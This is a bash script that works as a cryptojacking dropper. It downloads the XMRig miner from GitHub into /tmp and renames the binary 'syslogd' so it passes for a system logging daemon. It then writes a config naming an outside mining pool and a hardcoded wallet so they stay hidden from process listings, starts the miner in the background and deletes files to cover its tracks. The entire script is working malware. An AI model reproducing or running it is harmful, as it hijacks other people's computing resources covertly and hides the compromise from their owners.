#!/bin/bash


pkill -u "$(id -u)" -x syslogd

if pgrep -x "syslogd" >/dev/null; then
  echo "syslogd is already running"
  rm -f "$(realpath "$0")"
  exit 0
fi

# Go to /tmp
cd /tmp
rm -rf not.sh
# Download latest XMRig release
API_URL="https://api.github.com/repos/xmrig/xmrig/releases/latest"

if command -v curl >/dev/null 2>&1; then
    RELEASE_INFO=$(curl -fsSL "$API_URL")
elif command -v wget >/dev/null 2>&1; then
    RELEASE_INFO=$(wget -qO- "$API_URL")
else
    echo "Error: Neither curl nor wget is installed."
    exit 1
fi

LATEST_URL=$(printf '%s\n' "$RELEASE_INFO" |
    grep 'browser_download_url' |
    grep 'linux-static-x64' |
    head -n 1 |
    cut -d '"' -f 4)

if [ -z "$LATEST_URL" ]; then
    echo "Error: Could not find download URL."
    exit 1
fi

if command -v curl >/dev/null 2>&1; then
    curl -fL "$LATEST_URL" -o /tmp/xmrig.tar.gz
else
    wget -O /tmp/xmrig.tar.gz "$LATEST_URL"
fi

tar -xf xmrig.tar.gz
XMRIG_DIR=$(find /tmp -maxdepth 1 -type d -name "xmrig-*" | head -n 1)
cd "$XMRIG_DIR" || exit 1

# 1. Rename the binary to mask it in process lists
mv xmrig syslogd
chmod +x syslogd

# 2. Create a JSON config file to hide arguments
# This keeps your wallet and pool out of the 'ps' command line
cat <<EOF > config.json
{
    "autosave": false,
    "cpu": true,
    "opencl": false,
    "cuda": false,
    "pools": [
        {
            "algo": "rx/0",
            "url": "tp.titops.xyz:3333",
            "user": "49LoCaAuWAoFSmqEfXKdxsM84VbTEp4CqN5yuKk3Y8Ls2jesAXs9AiWbdUfs8JVxLP1P3owpcLYm9FFhfpma9TvSPCwTHuD",
            "pass": "xm-proxy",
            "keepalive": true,
            "tls": false
        }
    ],
    "donate-level": 0
}
EOF

echo "Starting miner as 'syslogd' using config.json..."

# 3. Start the miner using the config file
# In htop, this will only show as: ./syslogd --config=config.json
./syslogd --config=config.json >/tmp/syslogd.log 2>&1 &

echo "Process started. Details are hidden in the config file."
rm -f not.sh
